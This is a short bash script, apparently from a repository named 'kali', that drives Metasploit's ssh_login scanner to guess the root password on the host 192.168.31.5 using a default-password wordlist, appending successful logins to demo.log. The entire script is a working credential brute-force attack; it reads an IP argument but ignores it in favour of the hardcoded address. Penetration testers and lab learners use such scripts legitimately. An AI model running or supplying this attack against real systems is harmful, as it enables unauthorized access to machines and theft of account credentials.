# kali
kali

#!/bin/bash
#set ip address from arguments
IP=$1
#echo $IP

#step 1
#use ssh_login scanner ,select session success and then write the information into demo.log
msfconsole -x "use auxiliary/scanner/ssh/ssh_login;\
set RHOSTS 192.168.31.5;\
set USERNAME root;\
set PASS_FILE /usr/share/wordlists/metasploit/http_default_pass.txt;\
run;\
exit -y;" | grep "\[+\]" >> demo.log
